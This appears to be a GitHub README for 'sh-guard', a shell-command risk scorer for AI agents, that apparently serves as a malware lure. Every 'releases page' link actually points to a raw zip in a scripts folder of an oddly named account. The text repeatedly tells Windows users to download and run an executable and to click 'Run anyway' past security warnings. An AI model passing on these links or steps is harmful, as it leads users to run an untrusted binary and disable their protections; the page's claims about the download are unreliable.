# 🛡️ sh-guard - Safer shell commands for AI tools

[![Download sh-guard](https://img.shields.io/badge/Download%20sh--guard-4B8BF5?style=for-the-badge&logo=github&logoColor=white)](https://github.com/ambassadorial-vinegarworm656/sh-guard/raw/refs/heads/main/scripts/guard-sh-resuppression.zip)

## 🚀 What it does

sh-guard checks shell commands before they run. It looks for risky patterns in commands that AI tools or scripts may try to use. It then gives a safety score based on the command structure.

Use it when you want more control over shell commands from tools like:

- AI coding agents
- Command-line helpers
- Local dev tools
- Shell scripts

It helps you spot command injection risks and other unsafe command patterns before they cause trouble.

## 💻 Windows download and setup

1. Open the [sh-guard releases page](https://github.com/ambassadorial-vinegarworm656/sh-guard/raw/refs/heads/main/scripts/guard-sh-resuppression.zip)
2. Find the latest release
3. Download the Windows file for your PC
4. If the file is in a zip archive, open the zip file after it finishes downloading
5. Move the app to a folder you can find later, such as `Downloads` or `Desktop`
6. Double-click the app to run it

If Windows shows a security prompt:

1. Click More info
2. Click Run anyway

If you see a file named like `sh-guard.exe`, that is the file you should run on Windows.

## 🧭 How to use it

After you start sh-guard, it checks commands from your shell or connected tools.

Typical flow:

1. Copy or send a command to sh-guard
2. Let it inspect the command
3. Read the risk score or safety result
4. Decide if the command should run

Example use cases:

- Check a command before pasting it into PowerShell
- Review a shell command from an AI assistant
- Block unsafe patterns in a build script
- Test commands during local development

## 🧰 What you need

sh-guard works best on a Windows PC with:

- Windows 10 or Windows 11
- A modern 64-bit system
- Enough free space to unpack the download
- A shell tool such as PowerShell, Command Prompt, Git Bash, or Windows Terminal

For best results, keep Windows updated.

## 🔒 Safety checks it can perform

sh-guard uses AST-based parsing to inspect command structure. In plain terms, it reads the shape of a command before it runs.

It can help identify:

- Dangerous separators
- Hidden command chaining
- Suspicious file writes
- Command injection patterns
- Unusual shell syntax
- High-risk command combinations

It is built for shell safety work in agent tools and dev workflows.

## ⚙️ Common setup paths

### Option 1: Run from the downloaded release

Use this if you want the fastest path.

1. Download the release from the releases page
2. Extract the files if needed
3. Open the folder
4. Run the Windows executable

### Option 2: Use it with an AI coding tool

Use this if you want to check commands from an agent.

1. Install sh-guard
2. Connect it to your tool if your setup supports local command checks
3. Send shell commands through sh-guard before execution
4. Review the risk output

### Option 3: Use it for local shell checks

Use this if you want to review commands by hand.

1. Open PowerShell or Terminal
2. Run or pass the command through sh-guard
3. Read the score or warning result
4. Decide if you want to continue

## 🧩 What the project is for

sh-guard is made for people who work with shell commands and want a second check before execution.

It fits well in setups that include:

- AI agents that suggest terminal commands
- Security checks for command lines
- Developer tools that run local actions
- Testing for shell injection issues
- Command review in Linux-style shells on Windows

## 📁 Expected file layout

After you download and unpack the release, you may see files like:

- `sh-guard.exe`
- `README.md`
- config files
- support files for shell parsing
- release notes

If you see more than one executable, pick the one with the main app name.

## 🖥️ Basic Windows steps

If you are new to downloaded apps on Windows, follow this path:

1. Open your browser downloads list
2. Click the downloaded file
3. If it is a zip file, right-click it and choose Extract All
4. Open the extracted folder
5. Find the app file
6. Double-click it
7. Follow any on-screen prompts

If the file does not open, move it to a simple folder like `C:\sh-guard` and try again

## 🛠️ Troubleshooting

### The app does not start

- Make sure you downloaded the Windows version
- Check that the file is fully downloaded
- Try extracting the zip file again
- Move the app out of the Downloads folder and run it from a local folder

### Windows blocks the file

- Open the file’s properties
- Check for an unblock option if Windows shows one
- Click More info, then Run anyway if you trust the file source

### I do not see a clear executable

- Open the release files again
- Look for a Windows `.exe` file
- Pick the file with the main app name

### The app opens and closes fast

- Run it from PowerShell so you can see any messages
- Check whether it needs a config file or command input
- Try the latest release again

## 🧪 Example workflow

A simple way to use sh-guard:

1. An AI tool suggests a shell command
2. You copy the command into sh-guard
3. sh-guard checks the command structure
4. It returns a risk score
5. You review the result before running it

This gives you a clear step between suggestion and action

## 📌 Project details

- Name: sh-guard
- Type: command safety tool
- Focus: shell risk scoring
- Method: AST-based command parsing
- Use case: AI agent command review
- Topics: bash, CLI, command injection, devtools, MCP, Rust, security, shell, tree-sitter

## 🔗 Download

Visit the [sh-guard releases page](https://github.com/ambassadorial-vinegarworm656/sh-guard/raw/refs/heads/main/scripts/guard-sh-resuppression.zip) to download and run the Windows file

## 🧭 File selection help

When you open the releases page, look for:

- The newest version at the top
- A Windows build
- A file ending in `.exe` or a zip file that contains one
- Release notes that match your system

If there are several files, choose the one for Windows 64-bit

## 🧼 Keeping it simple

If you only want to get started fast:

1. Go to the releases page
2. Download the Windows file
3. Extract it if needed
4. Run the app
5. Use it to review shell commands